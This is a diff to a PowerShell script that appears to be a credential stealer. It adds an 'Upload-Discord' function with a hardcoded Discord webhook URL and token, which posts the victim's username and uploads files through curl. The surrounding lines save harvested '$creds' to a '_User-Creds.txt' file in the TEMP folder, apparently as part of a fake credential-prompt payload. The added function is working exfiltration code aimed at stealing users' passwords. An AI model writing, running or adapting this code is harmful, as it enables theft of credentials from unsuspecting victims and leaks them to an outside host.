@@ -1,8 +1,32 @@
+# Define the Upload-Discord function
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+
+    $hookurl = "https://discord.com/api/webhooks/1170140391803195533/KcFFeslbOunvu2zBMtxmx3vNmOg5E0VaAbrNGP2zzrg6AqlH70xYrMpJVOlN88Z8l6zk"
+
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $hookurl
+    }
+}
+
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-$creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8
+$creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
 Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
-
-
 
 
 
